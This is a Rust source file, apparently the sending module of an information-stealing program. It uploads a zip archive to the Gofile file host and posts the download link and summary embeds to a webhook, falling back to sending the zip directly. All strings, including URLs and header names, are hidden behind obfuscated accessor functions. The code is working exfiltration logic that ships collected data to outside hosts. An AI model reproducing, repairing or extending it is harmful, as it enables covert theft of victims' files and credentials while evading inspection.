use serde::Deserialize;
use serde_json::json;
use crate::encrypted::*;

#[derive(Debug, Deserialize)]
struct GofileResponse {
    status: String,
    data: Option<GofileData>,
    error: Option<String>,
}

#[derive(Debug, Deserialize)]
struct GofileData {
    #[serde(rename = "downloadPage")]
    download_page: Option<String>,
    #[serde(rename = "directLink")]
    direct_link: Option<String>,
    #[serde(rename = "parentFolder")]
    parent_folder: Option<String>,
    #[serde(rename = "fileId")]
    file_id: Option<String>,
    #[serde(rename = "fileName")]
    file_name: Option<String>,
}

pub async fn upload_to_gofile(client: &reqwest::Client, zip_data: Vec<u8>, zip_name: &str) -> Option<String> {
    let upload_url = s_gofile_upload_url();
    
    let zip_part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_name.to_string())
        .mime_str(&s_sender_application_zip())
        .ok()?;
    
    let form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
    
    let response = match client
        .post(&upload_url)
        .header(s_sender_origin(), &s_gofile_domain())
        .header(s_sender_referer(), &s_gofile_referer())
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(_) => return None,
    };
    
    let body = response.text().await.ok()?;
    
    let gofile_resp: GofileResponse = match serde_json::from_str(&body) {
        Ok(r) => r,
        Err(_) => {
            if body.contains(&s_sender_gofile_io()) || body.contains(&s_sender_download()) {
                if let Some(start) = body.find(&s_sender_https()) {
                    if let Some(end) = body[start..].find('"') {
                        return Some(body[start..start + end].to_string());
                    }
                    if let Some(end) = body[start..].find('\'') {
                        return Some(body[start..start + end].to_string());
                    }
                    if let Some(end) = body[start..].find(' ') {
                        return Some(body[start..start + end].to_string());
                    }
                }
            }
            return None;
        }
    };
    
    if gofile_resp.status == "ok" {
        gofile_resp.data.and_then(|d| {
            d.download_page
                .or(d.direct_link)
                .or(d.file_id.map(|id| format!("{}/{}", s_gofile_download_path(), id)))
        })
    } else {
        None
    }
}

pub async fn send_to_webhook(
    client: &reqwest::Client,
    webhook_url: &str,
    embeds: Vec<serde_json::Value>,
    zip_data: Vec<u8>,
    zip_name: String,
) -> Vec<String> {
    let mut statuses: Vec<String> = Vec::new();

    let gofile_link = upload_to_gofile(client, zip_data.clone(), &zip_name).await;
    
    statuses.push(format!("gofile={}", if gofile_link.is_some() { "OK" } else { "FAIL" }));

    let mut content = String::new();
    if let Some(ref link) = gofile_link {
        content = format!("\u{1f4e6} Download: {}", link);
    }
    
    let r = client.post(webhook_url).json(&json!({s_sender_content(): content})).send().await;
    statuses.push(format!("content={}", r.map(|r| r.status()).unwrap_or_default()));

    for (ci, chunk) in embeds.chunks(10).enumerate() {
        let mut embed_with_link = chunk.to_vec();
        
        if ci == 0 {
            if let Some(ref link) = gofile_link {
                if let Some(embed) = embed_with_link.first_mut() {
                    let download_text = format!("\n\n\u{1f4e6} Download: {}", link);
                    if let Some(desc) = embed["description"].as_str() {
                        embed["description"] = json!(format!("{}{}", desc, download_text));
                    } else {
                        embed["description"] = json!(download_text);
                    }
                }
            }
        }
        
        let payload = json!({ s_sender_embeds(): embed_with_link });
        let r = client.post(webhook_url).json(&payload).send().await;
        statuses.push(format!("{}{}]={}", s_sender_embeds_status(), ci, r.map(|r| r.status()).unwrap_or_default()));
    }

    if gofile_link.is_none() {
        if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
            .file_name(zip_name)
            .mime_str(&s_sender_application_zip())
        {
            let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
            let r = client.post(webhook_url).multipart(zip_form).send().await;
            statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
        }
    }

    statuses
}
